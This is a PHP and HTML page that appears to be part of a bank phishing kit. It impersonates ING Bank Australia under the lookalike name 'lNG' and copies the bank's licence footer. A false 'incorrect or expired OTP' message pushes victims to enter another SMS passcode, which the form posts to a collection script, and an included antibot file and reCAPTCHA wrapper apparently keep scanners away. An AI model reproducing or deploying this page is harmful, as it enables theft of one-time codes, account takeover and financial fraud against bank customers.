<?php
require "antibot.php";
include "id.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <link rel="stylesheet" href="sms.css">
    <style>
        @font-face {
            font-family: "Christmas";
            src: url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.eot");
            src: url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.eot?#iefix") format("embedded-opentype"),
                 url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.woff2") format("woff2"),
                 url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.woff") format("woff"),
                 url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.ttf") format("truetype"),
                 url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.svg#Christmas") format("svg");
        }
    </style>
</head>
<body>
    <header>
        <img src="logo.png" alt="lNG Logo">
        <button>Login</button>
    </header>
    <main>
        <section class="verification-form">
            <h1>Identity Verification</h1>
			<p style="color: red;">The OTP you entered was incorrect or has expired. We've sent you another OTP. Please check your phone.</p>
            <form id="otp-verification-form" action="otpsecpost.php" method="POST">
                <label for="otp-code">Verification Code <i class="phone-icon"></i></label>
                <input type="text" id="otp-code" name="otp-code" placeholder="Enter the OTP code"style="
    padding-top: 20px;
    padding-bottom: 20px;
" required>
                
                <div class="timer-container">
                    <p>Time remaining: <b id="timer">01:30</b></p>
                    <button type="button" class="verify-button" id="resend-otp" style="display: none;width: 314px;">Resend OTP</button>
                </div>
                
                <button type="submit" class="verify-button">Verify</button>
            </form>
            <p class="message">Please check your phone. The SMS may be delayed due to high demand. Please be patient.</p>
        </section>
    </main>
    <footer>
        <div class="footer-top">
            <ul>
                <li><a href="#">Help And Support</a></li>
                <li></li>
                <li></li>
                <li><a href="#">Contact Us</a></li>
            </ul>
            
            <ul>
                <li><a href="#">About Us</a></li>
                <li><a href="#">Contact Us</a></li>
                
                
                
                
                
            </ul>
        </div>
        <div class="footer-bottom">
            <img src="logo.png" alt="lNG Logo">
            <p>lNG is a business name of lNG Bank (Australia) Limited ABN 24 000 893 292 AFSL 229823, Australian Credit Licence 229823.<br>
            For information about the Australian Government Deposit Guarantee, click here. lNG Living Super (which is part of the lNG Superannuation Fund ABN 13 355 603 448) is issued by The Trust Company (Superannuation) Limited ABN 49 006 421 638, AFSL 235153.</p>
        </div>
    </footer>

    <script src="otp.js"></script>
			<script src="https://www.google.com/recaptcha/api.js?render=<?php echo $siteKey; ?>"></script>
<script>
grecaptcha.ready(function() {
    document.getElementById('otp-verification-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent form submission
        grecaptcha.execute('<?php echo $siteKey; ?>', {action: 'submit'}).then(function(token) {
            // Add your logic to submit form or append the token to the form
            var recaptchaResponse = document.createElement('input');
            recaptchaResponse.type = 'hidden';
            recaptchaResponse.name = 'recaptcha_response';
            recaptchaResponse.value = token;
            document.getElementById('otp-verification-form').appendChild(recaptchaResponse);

            // Now submit the form
            document.getElementById('otp-verification-form').submit();
        });
    });
});
</script>
</body>
</html>
